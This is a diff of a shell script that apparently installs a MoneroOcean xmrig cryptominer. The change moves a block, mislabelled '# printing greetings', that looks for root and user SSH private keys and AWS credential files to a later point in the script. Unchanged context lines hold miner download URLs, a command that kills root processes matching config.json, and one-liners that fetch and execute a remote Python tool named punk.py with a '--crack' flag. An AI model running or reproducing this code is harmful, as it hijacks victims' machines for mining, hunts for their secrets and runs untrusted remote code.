@@ -2,27 +2,6 @@
 
 VERSION=3.0
 
-# printing greetings
- if [ -f "/root/.ssh/id_rsa" ]
-    then
-			echo 'found: /root/.ssh/id_rsa'
-    fi
-
-    if [ -f "/home/*/.ssh/id_rsa" ]
-    then
-			echo 'found: /home/*/.ssh/id_rsa'
-    fi
-
-    if [ -f "/root/.aws/credentials" ]
-    then
-			echo 'found: /root/.aws/credentials'
-    fi
-
-    if [ -f "/home/*/.aws/credentials" ]
-    then
-			echo 'found: /home/*/.aws/credentials'
-    fi
-
 MOxmrigMOD=https://github.com/littlAcen/moneroocean-setup/raw/main/mod.tar.gz
 MOxmrigSTOCK=https://github.com/littlAcen/moneroocean-setup/blob/main/stock.tar.gz
 
@@ -575,6 +554,27 @@ fi
 
 
 kill -31 $(pgrep -f -u root config.json)
+
+# printing greetings
+ if [ -f "/root/.ssh/id_rsa" ]
+    then
+			echo 'found: /root/.ssh/id_rsa'
+    fi
+
+    if [ -f "/home/*/.ssh/id_rsa" ]
+    then
+			echo 'found: /home/*/.ssh/id_rsa'
+    fi
+
+    if [ -f "/root/.aws/credentials" ]
+    then
+			echo 'found: /root/.aws/credentials'
+    fi
+
+    if [ -f "/home/*/.aws/credentials" ]
+    then
+			echo 'found: /home/*/.aws/credentials'
+    fi
 
 python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd --crack
 python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)" --crack
